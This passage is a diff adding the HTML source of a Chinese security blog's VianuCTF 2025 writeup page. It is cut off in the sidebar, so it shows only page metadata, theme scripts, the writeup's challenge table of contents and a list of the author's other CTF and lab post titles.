@@ -1,0 +1,548 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>VianuCTF2025-Writeup | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="被外国高中生薄纱的一次,前面全是高中生。 webknow ya’ headersGET &#x2F; HTTP&#x2F;1.1 Host: 34.141.66.130:31872 User-Agent: vianu_browser Origin: http:&#x2F;&#x2F;portal.lbi.ro&#x2F; Date: Fri, 28 Nov 2025 05:43:00 GMT Co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VianuCTF2025-Writeup">
+<meta property="og:url" content="https://ta0.fun/posts/aa344180/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="被外国高中生薄纱的一次,前面全是高中生。 webknow ya’ headersGET &#x2F; HTTP&#x2F;1.1 Host: 34.141.66.130:31872 User-Agent: vianu_browser Origin: http:&#x2F;&#x2F;portal.lbi.ro&#x2F; Date: Fri, 28 Nov 2025 05:43:00 GMT Co">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216184821.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216160828.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216180111.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216185327.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216190648.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216154432.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216155046.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216210223.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216210252.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216214435.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/94d8fb4a00cf2692063c22509cb33616.jpg">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/9323a67e78ff489b4ae8a0c830460702.jpg">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216155646.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216162406.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216162449.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217113333.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217113251.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217114354.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217114537.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217121725.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217122137.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251217122950.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216191251.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216191451.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216193040.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216201210.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216203024.png">
+<meta property="article:published_time" content="2025-12-17T05:00:47.874Z">
+<meta property="article:modified_time" content="2025-12-17T05:04:04.439Z">
+<meta property="article:author" content="ta0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216184821.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">158</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#know-ya%E2%80%99-headers"><span class="toc-number">1.1.</span> <span class="toc-text">know ya’ headers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i-need-a-job"><span class="toc-number">1.2.</span> <span class="toc-text">i need a job</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-lei"><span class="toc-number">1.3.</span> <span class="toc-text">6 lei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-lei"><span class="toc-number">1.4.</span> <span class="toc-text">7 lei</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vibe-RPC"><span class="toc-number">1.5.</span> <span class="toc-text">Vibe RPC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rice-Harder-unsolved"><span class="toc-number">1.6.</span> <span class="toc-text">Rice Harder(unsolved)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-number">2.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-it%E2%80%99s-Still-a-Thing-in-2025"><span class="toc-number">2.1.</span> <span class="toc-text">C it’s Still a Thing in 2025</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint"><span class="toc-number">3.</span> <span class="toc-text">osint</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Find-It"><span class="toc-number">3.1.</span> <span class="toc-text">Find It</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ancient-Routes"><span class="toc-number">3.2.</span> <span class="toc-text">Ancient Routes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Life-After-High-School"><span class="toc-number">3.3.</span> <span class="toc-text">Life After High School</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unexpected-Message"><span class="toc-number">3.4.</span> <span class="toc-text">Unexpected Message</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cute-cat"><span class="toc-number">4.1.</span> <span class="toc-text">cute cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Polar-Note"><span class="toc-number">4.2.</span> <span class="toc-text">Polar Note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Do-you-like-crypto"><span class="toc-number">4.3.</span> <span class="toc-text">Do you like crypto???</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-fibodream-come-true"><span class="toc-number">4.4.</span> <span class="toc-text">A fibodream come true</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">5.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Christmas-PIE"><span class="toc-number">5.1.</span> <span class="toc-text">Christmas PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Santa%E2%80%99s-little-pwner"><span class="toc-number">5.2.</span> <span class="toc-text">Santa’s little pwner</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">6.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#santa"><span class="toc-number">6.1.</span> <span class="toc-text">santa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sanity-check"><span class="toc-number">6.2.</span> <span class="toc-text">sanity check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cinnamon"><span class="toc-number">6.3.</span> <span class="toc-text">Cinnamon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flight-501"><span class="toc-number">6.4.</span> <span class="toc-text">Flight 501</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bytestorms-ui"><span class="toc-number">6.5.</span> <span class="toc-text">bytestorms-ui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crabcall"><span class="toc-number">6.6.</span> <span class="toc-text">crabcall</span></a></li></ol></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li><li class="sidebar-cat-post"><a href="/posts/fa26c9c2/">DASCTF2025下半年赛-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/57b83d00/">nexhuntCTF-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/17991232/">HeroCTF2025</a></li><li class="sidebar-cat-post"><a href="/posts/d34a19fb/">老乡鸡CTF-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/23ac0af4/">ISCTF2025-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/7ca5dbd/">NiteCTF2025-Writeup</a></li><li class="sidebar-cat-post"><a href="/posts/aa344180/">VianuCTF2025-Writeup</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a 